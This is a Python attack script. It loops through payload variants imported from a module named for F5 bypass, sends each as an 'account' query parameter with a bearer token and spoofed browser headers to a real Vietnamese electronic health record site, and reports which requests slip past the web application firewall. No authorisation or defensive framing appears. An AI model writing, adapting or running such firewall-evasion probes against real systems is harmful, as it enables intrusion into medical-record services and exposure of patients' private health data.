import sys
from pathlib import Path
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from evasion.curl_bypass_f5 import BASE_URL, BEARER, RAW_PAYLOAD, variants_f5

try:
    import requests
except ImportError:
    print("Install: pip install requests")
    sys.exit(1)

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Authorization": f"Bearer {BEARER}",
    "Origin": "https://ybadientu.hososuckhoe.vn",
    "Referer": "https://ybadientu.hososuckhoe.vn/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
}


def main():
    payloads = variants_f5(RAW_PAYLOAD)
    for i, (payload, name) in enumerate(payloads):
        q = quote(payload, safe="") if not payload.startswith("36331%") else payload
        url = f"{BASE_URL}?account={q}"
        try:
            r = requests.get(url, headers=HEADERS, timeout=15)
            status = r.status_code
            ok = 200 <= status < 300
            hint = ""
            if "reject" in (r.text or "").lower() or status in (403, 406, 503):
                ok = False
                hint = " (likely blocked)"
            print(f"[{i+1:2}] {name:24} -> {status} {'OK bypass?' if ok else 'blocked'}{hint}")
        except requests.RequestException as e:
            print(f"[{i+1:2}] {name:24} -> error: {e}")


if __name__ == "__main__":
    main()
